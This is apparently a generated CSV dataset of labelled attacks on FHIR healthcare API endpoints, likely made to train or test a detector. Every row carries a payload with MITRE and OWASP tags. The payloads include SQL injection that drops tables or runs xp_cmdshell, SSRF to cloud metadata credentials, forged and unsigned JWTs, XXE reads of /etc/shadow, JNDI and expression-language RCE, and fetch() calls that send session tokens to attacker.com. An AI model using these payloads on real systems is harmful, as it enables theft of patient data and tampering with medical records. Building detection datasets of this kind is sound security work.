attack_id,vector_type,fhir_resource,target_endpoint,http_method,payload,expected_impact,mitre_ttp,mitre_tactic,owasp_llm,severity,is_attack,generated_at,model_used,temperature
ATK_041,jwt_token_forgery,Bundle,/fhir/r4/Bundle,POST,eyJhbGciOiJIUzI1NiIsImtpZCI6ImludmFsaWQta2V5In0.eyJzdWIiOiJidW5kbGUtYXR0YWNrIiwicm9sZSI6ImFkbWluIiwic2NvcGUiOiIqIn0.mismatched_signature,Unauthorised submission of malicious bundles and batch operations,T1078.004,Persistence,LLM06,critical,true,,,
ATK_042,fhir_endpoint_enumeration,Patient,/fhir/r4/Patient,OPTIONS,OPTIONS /fhir/r4/Patient HTTP/1.1,Enumeration of allowed HTTP methods on Patient resource,T1083,Discovery,LLM07,high,true,,,
ATK_043,fhir_endpoint_enumeration,Observation,/fhir/r4/Observation,HEAD,HEAD /fhir/r4/Observation,Discovery of Observation endpoint existence and response headers,T1083,Discovery,LLM07,medium,true,,,
ATK_044,fhir_endpoint_enumeration,Encounter,/fhir/r4/Encounter?_summary=true,GET,GET /fhir/r4/Encounter?_summary=true,Enumeration of Encounter resources with minimal data disclosure,T1083,Discovery,LLM07,high,true,,,
ATK_045,fhir_endpoint_enumeration,Condition,/fhir/r4/Condition,GET,GET /fhir/r4/Condition?_count=1000,Mass enumeration of Condition resources with high page count,T1083,Discovery,LLM07,critical,true,,,
ATK_046,fhir_endpoint_enumeration,MedicationRequest,/fhir/r4/MedicationRequest,GET,GET /fhir/r4/MedicationRequest?status=active,Enumeration of active medication requests across patients,T1083,Discovery,LLM07,critical,true,,,
ATK_047,fhir_endpoint_enumeration,Practitioner,/fhir/r4/Practitioner,GET,"GET /fhir/r4/Practitioner?_elements=name,identifier",Enumeration of healthcare practitioners and their identifiers,T1083,Discovery,LLM07,high,true,,,
ATK_048,fhir_endpoint_enumeration,Organization,/fhir/r4/Organization,GET,GET /fhir/r4/Organization?type=prov,Discovery of healthcare provider organizations in system,T1083,Discovery,LLM07,medium,true,,,
ATK_049,fhir_endpoint_enumeration,AllergyIntolerance,/fhir/r4/AllergyIntolerance,GET,GET /fhir/r4/AllergyIntolerance?clinical-status=active,Enumeration of active patient allergies across system,T1083,Discovery,LLM07,critical,true,,,
ATK_050,fhir_endpoint_enumeration,DiagnosticReport,/fhir/r4/DiagnosticReport,GET,GET /fhir/r4/DiagnosticReport?date=ge2023-01-01,Enumeration of diagnostic reports by date range,T1083,Discovery,LLM07,high,true,,,
ATK_051,fhir_endpoint_enumeration,Procedure,/fhir/r4/Procedure,GET,GET /fhir/r4/Procedure?status=completed&_count=500,Mass enumeration of completed medical procedures,T1083,Discovery,LLM07,critical,true,,,
ATK_052,fhir_endpoint_enumeration,Location,/fhir/r4/Location,GET,GET /fhir/r4/Location?status=active,Discovery of active healthcare facility locations,T1083,Discovery,LLM07,medium,true,,,
ATK_053,fhir_endpoint_enumeration,Bundle,/fhir/r4/,GET,"GET /fhir/r4/?_type=Patient,Observation,MedicationRequest",Enumeration of multiple FHIR resource types in single request,T1083,Discovery,LLM07,high,true,,,
ATK_054,sql_injection,Patient,/fhir/r4/Patient,POST,name=John'; DROP TABLE Patient;--,Patient table deletion,T1190,Initial Access,LLM02,critical,true,,,
ATK_055,sql_injection,Observation,/fhir/r4/Observation,GET,?status=final' UNION SELECT * FROM User WHERE '1'='1,Unauthorized user credentials extracted,T1190,Initial Access,LLM02,critical,true,,,
ATK_056,sql_injection,MedicationRequest,/fhir/r4/MedicationRequest,PUT,"{""status"":""active' OR '1'='1""}",All medication requests modified,T1190,Initial Access,LLM02,high,true,,,
ATK_057,sql_injection,Encounter,/fhir/r4/Encounter,GET,?period=2023-01-01' AND (SELECT COUNT(*) FROM Patient) > 0--,Database reconnaissance and patient count disclosure,T1190,Initial Access,LLM02,high,true,,,
ATK_058,sql_injection,Condition,/fhir/r4/Condition,POST,code='; EXEC xp_cmdshell 'dir';--,Operating system command execution,T1190,Initial Access,LLM02,critical,true,,,
ATK_059,sql_injection,Procedure,/fhir/r4/Procedure,GET,?performed-date=2023'; WAITFOR DELAY '00:00:05'--,"Time-based blind SQL injection, system delay",T1190,Initial Access,LLM02,medium,true,,,
ATK_060,sql_injection,DiagnosticReport,/fhir/r4/DiagnosticReport,GET,"?issued=2023-01-01' UNION ALL SELECT database(),user(),version()--","Database name, user, and version disclosure",T1190,Initial Access,LLM02,high,true,,,
ATK_061,sql_injection,AllergyIntolerance,/fhir/r4/AllergyIntolerance,DELETE,id=1' OR 'a'='a,All allergy intolerance records deleted,T1190,Initial Access,LLM02,critical,true,,,
ATK_062,sql_injection,Device,/fhir/r4/Device,GET,"?identifier=' AND SUBSTRING(password,1,1)='a'--",Character-by-character password extraction,T1190,Initial Access,LLM02,critical,true,,,
ATK_063,sql_injection,Immunization,/fhir/r4/Immunization,POST,"{""vaccineCode"":""'; INSERT INTO admin (username,password) VALUES ('hacker','pass123');--""}",Unauthorized admin account creation,T1190,Initial Access,LLM02,critical,true,,,
ATK_064,sql_injection,Organization,/fhir/r4/Organization,GET,?name=test' UNION SELECT column_name FROM information_schema.columns--,Database schema enumeration,T1190,Initial Access,LLM02,high,true,,,
ATK_065,sql_injection,Practitioner,/fhir/r4/Practitioner,PUT,"{""qualification"":""cert' OR '1'=1 UNION SELECT * FROM credentials--""}",Credential data exfiltration,T1190,Initial Access,LLM02,high,true,,,
ATK_066,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,file:///etc/passwd,Server reads local filesystem and exposes sensitive files,T1071.001,Command and Control,LLM02,critical,true,,,
ATK_067,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,PUT,http://169.254.169.254/latest/meta-data/iam/security-credentials/,Server retrieves AWS IAM credentials from metadata service,T1071.001,Command and Control,LLM02,critical,true,,,
ATK_068,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,gopher://internal-db:5432/query,Server connects to internal database using gopher protocol,T1071.001,Command and Control,LLM02,high,true,,,
ATK_069,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,http://localhost:8080/admin/dashboard,Server accesses internal admin panel through SSRF,T1071.001,Command and Control,LLM02,high,true,,,
ATK_070,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,PATCH,dict://attacker.com:1234@evil.com/shell.php,Server fetches and executes remote shell script,T1071.001,Command and Control,LLM02,critical,true,,,
ATK_071,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,http://127.0.0.1:22,Server probes internal SSH service and reveals banner,T1071.001,Command and Control,LLM02,medium,true,,,
ATK_072,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,http://10.0.0.1/backup/database.sql,Server downloads internal backup database exposing PHI,T1071.001,Command and Control,LLM02,critical,true,,,
ATK_073,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,ldap://internal-ldap:389/cn=admin,Server connects to LDAP service and extracts directory information,T1071.001,Command and Control,LLM02,high,true,,,
ATK_074,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,http://192.168.1.1/admin?token=bypass,Server bypasses authentication to access router admin panel,T1071.001,Command and Control,LLM02,high,true,,,
ATK_075,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,http://attacker.com@internal-service.local/endpoint,Server connects to internal service using URL credential injection,T1071.001,Command and Control,LLM02,high,true,,,
ATK_076,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,tftp://internal-config-server/sensitive.conf,Server retrieves configuration files via TFTP protocol,T1071.001,Command and Control,LLM02,high,true,,,
ATK_077,ssrf_medication_url,MedicationRequest,/fhir/r4/MedicationRequest,POST,http://0x7f000001:8888/internal/api/patients,Server bypasses localhost filter using hex IP encoding,T1071.001,Command and Control,LLM02,medium,true,,,
ATK_078,role_spoofing,Practitioner,/fhir/r4/Patient/{id}/Document,POST,eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW5pc3RyYXRvciIsInN1YiI6IjEyMzQ1Njc4OTAifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c,Unauthorized access to patient documents and records,T1078.004,Privilege Escalation,LLM06,critical,true,,,
ATK_079,role_spoofing,Organization,/fhir/r4/DiagnosticReport/{id},GET,eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoibGFiX2RpcmVjdG9yIiwib3JnIjoiSG9zcGl0YWwifQ.fake_signature_data,Access to lab results across multiple organizations,T1078.004,Privilege Escalation,LLM06,high,true,,,
ATK_080,role_spoofing,Practitioner,/fhir/r4/MedicationRequest,POST,eyJhbGciOiJub25lIn0.eyJyb2xlIjoicGhhcm1hY2lzdCIsInByYWN0aXRpb25lcl9pZCI6IlBSQzAwMTIzIn0.,Unauthorized prescription creation and medication order manipulation,T1078.004,Privilege Escalation,LLM06,critical,true,,,
ATK_081,role_spoofing,Patient,/fhir/r4/Observation,PUT,eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoicmFkaW9sb2dpc3QiLCJkZXBhcnRtZW50IjoiSW1hZ2luZyJ9.abcdef123456,Modification of medical observations and test results,T1078.004,Privilege Escalation,LLM06,high,true,,,
ATK_082,role_spoofing,Practitioner,/fhir/r4/Patient/{id}/Condition,DELETE,eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJfYWRtaW4iLCJzdWIiOiJhZG1pbjAwMSJ9.xyz789,Deletion of patient medical conditions and history tampering,T1078.004,Privilege Escalation,LLM06,critical,true,,,
ATK_083,role_spoofing,Organization,/fhir/r4/Encounter,GET,eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjMifQ.eyJyb2xlIjoiY2hlZl9tZWRpY2FsX29mZmljZXIiLCJvcmdfaWQiOiJPUkcwMDEifQ.sig_data_here,Unauthorized view of all patient encounters and scheduling,T1078.004,Privilege Escalation,LLM06,high,true,,,
ATK_084,role_spoofing,Practitioner,/fhir/r4/Patient/{id}/Bundle,POST,eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoiZXhlY3V0aXZlX2hlYWx0aF9vZmZpY2VyIn0.fake_rsa_sig,Bulk patient data export and unauthorized information disclosure,T1078.004,Privilege Escalation,LLM06,critical,true,,,
ATK_085,role_spoofing,Patient,/fhir/r4/Immunization,PUT,eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiY2xpbmljYWxfbnVyc2UiLCJjbGluaWMiOiJWYWNjaW5hdGlvbiJ9.,Unauthorized modification of immunization records,T1078.004,Privilege Escalation,LLM06,high,true,,,
ATK_086,role_spoofing,Practitioner,/fhir/r4/AllergyIntolerance,GET,eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY2FyZV9jb29yZGluYXRvciIsImZhY2lsaXR5IjoiQWxsIn0.coord_sig,Cross-facility access to allergy information,T1078.004,Privilege Escalation,LLM06,medium,true,,,
ATK_087,role_spoofing,Organization,/fhir/r4/Procedure,POST,eyJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoic3VyZ2VvbiIsImNyZWRlbnRpYWxzIjoiQWN0aXZlIn0.high_entropy_sig,Unauthorized creation of surgical procedure records,T1078.004,Privilege Escalation,LLM06,critical,true,,,
ATK_088,role_spoofing,Practitioner,/fhir/r4/Patient/{id}/CareTeam,GET,eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiaW50ZXJpc3RpdGlhbCIsInBlcm1pc3Npb24iOiJmdWxsX2FjY2VzcyJ9.team_sig,Access to patient care team composition and contact information,T1078.004,Privilege Escalation,LLM06,high,true,,,
ATK_089,role_spoofing,Patient,/fhir/r4/Goal,PUT,eyJhbGciOiJub25lIn0.eyJyb2xlIjoiY2FyZV9wbGFubmVyIiwic3RhdHVzIjoiQWN0aXZlIn0.,Unauthorized modification of patient care goals and treatment plans,T1078.004,Privilege Escalation,LLM06,medium,true,,,
ATK_090,idor_patient_ids,Patient,/fhir/r4/Patient/5,GET,"GET /fhir/r4/Patient/5 HTTP/1.1
Host: api.healthcare.local
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",Unauthorised access to sensitive patient demographics and contact information,T1083,Discovery,LLM07,critical,true,,,
ATK_091,idor_patient_ids,Patient,/fhir/r4/Patient/12345,GET,GET /fhir/r4/Patient/12345?_format=json,Exposure of patient personal health information across multiple care episodes,T1083,Discovery,LLM07,high,true,,,
ATK_092,idor_patient_ids,Patient,/fhir/r4/Patient/999,GET,"GET /fhir/r4/Patient/999 HTTP/1.1
Range: bytes=0-1024",Unauthorised retrieval of patient identity and medical history,T1083,Discovery,LLM07,critical,true,,,
ATK_093,idor_patient_ids,Patient,/fhir/r4/Patient/1001,HEAD,HEAD /fhir/r4/Patient/1001,Information disclosure through response headers revealing patient existence,T1083,Discovery,LLM07,medium,true,,,
ATK_094,idor_patient_ids,Patient,/fhir/r4/Patient/500,GET,GET /fhir/r4/Patient/500;jsessionid=abc123def456,Session fixation leading to unauthorised patient record access,T1083,Discovery,LLM07,high,true,,,
ATK_095,idor_patient_ids,Patient,/fhir/r4/Patient/777,GET,"GET /fhir/r4/Patient/777 HTTP/1.1
X-Forwarded-For: 192.168.1.1",Bypass of IP-based access controls to access arbitrary patient records,T1083,Discovery,LLM07,high,true,,,
ATK_096,idor_patient_ids,Patient,/fhir/r4/Patient/2000,GET,GET /fhir/r4/Patient/2000/../2001 HTTP/1.1,Path traversal exploitation to access sequential patient identifiers,T1083,Discovery,LLM07,critical,true,,,
ATK_097,idor_patient_ids,Patient,/fhir/r4/Patient/100,GET,GET /fhir/r4/Patient/100?_count=9999&_sort=id,Enumeration of patient records through pagination parameter manipulation,T1083,Discovery,LLM07,high,true,,,
ATK_098,idor_patient_ids,Patient,/fhir/r4/Patient/8888,GET,"GET /fhir/r4/Patient/8888 HTTP/1.1
Cookie: user_id=7777",Cookie-based patient ID spoofing to access unintended records,T1083,Discovery,LLM07,high,true,,,
ATK_099,idor_patient_ids,Patient,/fhir/r4/Patient/333,OPTIONS,OPTIONS /fhir/r4/Patient/333 HTTP/1.1,Information disclosure about available HTTP methods for patient resource manipulation,T1083,Discovery,LLM07,low,true,,,
ATK_100,idor_patient_ids,Patient,/fhir/r4/Patient/4444,GET,GET /fhir/r4/Patient/4444?_include=Patient:general-practitioner HTTP/1.1,Unauthorised access to related practitioner and organisation data via patient resource,T1083,Discovery,LLM07,high,true,,,
ATK_101,idor_patient_ids,Patient,/fhir/r4/Patient/6666,GET,"GET /fhir/r4/Patient/6666 HTTP/1.1
Accept-Encoding: gzip, deflate
Cache-Control: no-cache",Retrieval of cached patient data bypassing potential access controls,T1083,Discovery,LLM07,medium,true,,,
ATK_102,hl7_message_injection,Bundle,/fhir/r4/$process-message,POST,<Bundle><entry><resource><Patient><name><given value=''; DROP TABLE patients; --'/></given></name></resource></entry></Bundle>,SQL injection via HL7 message processing,T1190,Initial Access,LLM03,critical,true,,,
ATK_103,hl7_message_injection,Observation,/fhir/r4/Observation/$validate,POST,"<Observation><value><Quantity><value value='${Runtime.getRuntime().exec(""bash"")}'/>",Remote code execution through expression language injection,T1059,Execution,LLM02,critical,true,,,
ATK_104,hl7_message_injection,DiagnosticReport,/fhir/r4/$process-message,POST,<DiagnosticReport><presented-form><data value='PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='/>,Base64 encoded XSS payload execution in diagnostic workflow,T1598,Initial Access,LLM01,high,true,,,
ATK_105,hl7_message_injection,MedicationRequest,/fhir/r4/$process-message,POST,<MedicationRequest><dosageInstruction><timing><repeat><boundsDuration value='1' system='http://unitsofmeasure.org' code='../../../etc/passwd'/></boundsDuration></repeat></timing></dosageInstruction></MedicationRequest>,Path traversal vulnerability in medication dosage processing,T1083,Discovery,LLM05,high,true,,,
ATK_106,hl7_message_injection,Encounter,/fhir/r4/$process-message,POST,<Encounter><location><location><reference value='Encounter/../../Patient/12345'/></location></location></Encounter>,Unauthorized access to patient records via reference traversal,T1580,Defense Evasion,LLM06,critical,true,,,
ATK_107,hl7_message_injection,Condition,/fhir/r4/$process-message,POST,<Condition><code><coding><system value='http://evil.com/callback?data='/><code value='<!--EXFIL_START-->'/></coding></code></Condition>,Data exfiltration through malicious coding system URLs,T1041,Exfiltration,LLM04,critical,true,,,
ATK_108,hl7_message_injection,Device,/fhir/r4/$process-message,POST,"<Device><identifier><system value='urn:custom'/><value value='&xxe; SYSTEM ""file:///etc/shadow""'/></identifier></Device>",XML External Entity attack to access sensitive system files,T1005,Collection,LLM03,critical,true,,,
ATK_109,hl7_message_injection,ProcedureRequest,/fhir/r4/$process-message,POST,"<ProcedureRequest><requester><agent><reference value='Practitioner/0' onload='fetch(""http://attacker.com/steal?token=""+sessionStorage.getItem(""auth_token""))'/></agent></requester></ProcedureRequest>",Session token theft through embedded event handlers,T1539,Credential Access,LLM02,critical,true,,,
ATK_110,hl7_message_injection,Immunization,/fhir/r4/$process-message,POST,"<Immunization><reaction><detail><reference value='javascript:void(document.location=""http://attacker.com/phishing"")'/></detail></reaction></Immunization>",Phishing redirect in immunization workflow,T1598,Initial Access,LLM01,high,true,,,
ATK_111,hl7_message_injection,CareTeam,/fhir/r4/$process-message,POST,<CareTeam><participant><role><coding><code value='${jndi:ldap://attacker.com/Evil}'/></coding></role></participant></CareTeam>,JNDI injection leading to remote class loading and RCE,T1203,Execution,LLM02,critical,true,,,
ATK_112,hl7_message_injection,Practitioner,/fhir/r4/$process-message,POST,"<Practitioner><name><given value='normal'/><family value='test""><meta><profile value='http://attacker.com/rce?cmd=whoami'/></meta></family></name></Practitioner>",Profile URL manipulation for command injection,T1059,Execution,LLM02,high,true,,,
ATK_113,hl7_message_injection,Organization,/fhir/r4/$process-message,POST,"<Organization><contact><telecom><system value='email'/><value value='test@example.com"" onload=""fetch(window.location.protocol+//attacker.com/c2)'/></telecom></contact></Organization>",C2 beacon injection in organization contact data,T1071,Command and Control,LLM04,critical,true,,,
